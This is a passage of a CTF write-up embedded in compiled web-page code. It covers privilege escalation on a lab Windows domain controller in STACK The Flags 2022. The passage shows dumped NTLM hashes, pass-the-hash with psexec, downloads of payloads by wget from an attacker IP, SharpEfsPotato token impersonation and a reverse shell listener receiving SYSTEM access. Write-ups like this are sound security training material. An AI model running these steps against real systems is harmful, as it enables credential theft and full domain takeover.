-k\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Dumping Domain Credentials (domain\\\\uid:rid:lmhash:nthash)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Using the DRSUAPI method to get NTDS.DIT secrets\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb313353c5eaceb1aae589b1644737bb:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ab92b60e75818bbb70ca754897aa1e37:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`LOOKOUT.local\\\\lhuman:1104:aad3b435b51404eeaad3b435b51404ee:de9ca94a6f5ea9113d3370476e42a9cb:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`LOOKOUT.local\\\\fhuman:1105:aad3b435b51404eeaad3b435b51404ee:1501f896cae1fd4f0bf6b9593e81dea3:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`LOOKOUT.local\\\\shuman:1106:aad3b435b51404eeaad3b435b51404ee:f4c0320c516b4eeae0533e930beee3c3:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`LOOKOUT-DC$:1001:aad3b435b51404eeaad3b435b51404ee:440f42cdda7c8d86dedc9655e8c003d0:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`<SNIP>\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Now with the administrator hash we can \",(0,e.jsx)(n.code,{children:\"psexec\"}),\" into the machine:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/wr \\xBB impacket-psexec Administrator@10.129.254.249 -hashes :cb313353c5eaceb1aae589b1644737bb     1 \\u21B5\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Requesting shares on 10.129.254.249.....\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Found writable share ADMIN$\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Uploading file HeqMQBmt.exe\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Opening SVCManager on 10.129.254.249.....\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Creating service bqIM on 10.129.254.249.....\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Starting service bqIM.....\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[!] Press help for extra shell commands\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Microsoft Windows [Version 10.0.17763.3650]\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(c) 2018 Microsoft Corporation. All rights reserved.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`C:\\\\Windows\\\\system32> whoami\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`nt authority\\\\system\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And then we grab both flags :D!\"}),`\n`,(0,e.jsxs)(n.h4,{id:\"second-way\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#second-way\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Second Way\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\system32> whoami /priv\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`whoami /priv\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`PRIVILEGES INFORMATION\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`----------------------\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Privilege Name                Description                               State\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`============================= ========================================= ========\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeMachineAccountPrivilege     Add workstations to domain                Disabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeImpersonatePrivilege        Impersonate a client after authentication Enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeCreateGlobalPrivilege       Create global objects                     Enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We have \",(0,e.jsx)(n.code,{children:\"SeImpersonatePrivilege\"}),\" Enabled. Since this is a Windows Server 2019, most of the known Potatos will not work. But likely, there is new potato that could exploit \",(0,e.jsx)(n.code,{children:\"SEimpersonatePrivilege\"}),\" using \",(0,e.jsx)(n.code,{children:\"EfsRpc\"}),\".\"]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.a,{href:\"https://github.com/bugch3ck/SharpEfsPotato\",children:\"https://github.com/bugch3ck/SharpEfsPotato\"})}),`\n`]}),`\n`,(0,e.jsx)(n.p,{children:\"We compile it with Visual Studio and upload it to the remote machine:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color> wget 10.10.14.57/xc_10.10.14.57_443.exe -o xc_10.10.14.57_443.exe\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color> wget 10.10.14.57/SharpEfsPotato.exe -o SharpEfsPotato.exe\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And then execute my reverse shell:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color> .\\\\SharpEfsPotato.exe -p C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\xc_10.10.14.57_443.exe\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SharpEfsPotato by @bugch3ck\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Triggering name pipe access on evil PIPE \\\\\\\\localhost/pipe/d112edc0-75de-4d57-8696-f7b9847761a6/\\\\d112edc0-75de-4d57-8696-f7b9847761a6\\\\d112edc0-75de-4d57-8696-f7b9847761a6\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[x]RpcBindingSetAuthInfo failed with status 0x6d3\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Server connected to our evil RPC pipe\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Duplicated impersonation token ready for process creation\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Intercepted and authenticated successfully, launching program\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Process created, enjoy!\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And I grabbed my shell:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/opt/xc(master\\u25CB) \\xBB ./xc -l -p 443                                                                                                                                                                                            1 \\u21B5\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\t\t__  _____\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\t\t\\\\ \\\\/ / __|\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\t\t>  < (__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\t\t/_/\\\\_\\\\___| by @xct_de\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\t\t           build: XBWQOEYPUG\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 09:05:16 Listening on :443\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 09:05:16 Waiting for connections...\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 09:07:06 Connection from 10.129.254.249:63732\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 09:07:06 Stream established\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Auto-Plugins:\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[xc: C:\\\\Windows\\\\system32]: whoami\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`nt authority\\\\system\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[xc: C:\\\\Windows\\\\system32]: hostname\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`LOOKOUT-DC\n`})]})})]})}}var w=f;return y;})();\n;return Component;","toc":[{"value":"BeautyCare (Fullpwn, 2000 Points)","url":"#beautycare-fullpwn-2000-points","depth":2},{"value":"Enumeration","url":"#enumeration","depth":3},{"value":"Exploitation","url":"#exploitation","depth":3},{"value":"Privilege Escalation","url":"#privilege-escalation","depth":3},{"value":"Electrogrid (Fullpwn, 2000 Points)","url":"#electrogrid-fullpwn-2000-points","depth":2},{"value":"Enumeration","url":"#enumeration","depth":3},{"value":"BONUS PART - Running GUI app","url":"#bonus-part---running-gui-app","depth":3},{"value":"Exploitation","url":"#exploitation","depth":3},{"value":"Privilege Escalation","url":"#privilege-escalation","depth":3},{"value":"Lookout (Fullpwn, 2000 Points)","url":"#lookout-fullpwn-2000-points","depth":2},{"value":"Enumeration","url":"#enumeration","depth":3},{"value":"Exploitation","url":"#exploitation","depth":3},{"value":"Privilege Escalation","url":"#privilege-escalation","depth":3},{"value":"First Way","url":"#first-way","depth":4},{"value":"Second Way","url":"#second-way","depth":4}],"frontMatter":{"readingTime":{"text":"32 min read","minutes":31.975,"time":1918500,"words":6395},"slug":"stack-the-flags-2022/fullpwn","fileName":"stack-the-flags-2022/fullpwn.md","title":"STACK The Flags 2022 Open  Fullpwn","date":"2022-12-05T00:00:00.000Z","draft":false,"authors":["elleuch"],"tags":["STACK The Flags 2022","fullpwn","Electron","XSS","RCE","Selenium","HackTheBox"],"summary":"Fullpwn Solutions from STACK The Flags CTF"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.19,"time":11400,"words":38},"slug":["elleuch"],"fileName":"elleuch.md","name":"ElleuchX1","avatar":"https://www.gravatar.com/avatar/7713c4f4229ca2e9b9291755957a2e42?d=identicon&s=256","specialties":["Web","boot2root"],"member":true,"description":"Yeah exactly, the HTB guy","order":7,"date":null}],"prev":{"title":"GDG Algiers CTF 2022  MLM","date":"2022-10-09T00:00:00.000Z","draft":false,"authors":["sahuang"],"tags":["GDG Algiers 2022","Misc","Forensics","pcapng","AI","Bert"],"summary":"Analyze pcapng for BERT layer data, then predict flag with Masked Language Modelling.","canonical":"https://sahuang.github.io/writeups/gdg-algiers-ctf-2022","slug":"gdg-algiers-2022/mlm"},"next":{"title":"idekCTF 2022*  NMPZ","date":"2023-01-15T00:00:00.000Z","draft":false,"authors":["enscribe"],"tags":["idekCTF 2022*","OSINT","GeoGuessr"],"summary":"No moving, panning, or zoominga GeoGuessr-style challenge testing geographical literacy.","canonical":"https://enscribe.dev/ctfs/idek/osint/nmpz/","slug":"idekctf-2022/nmpz"}},"__N_SSG":true}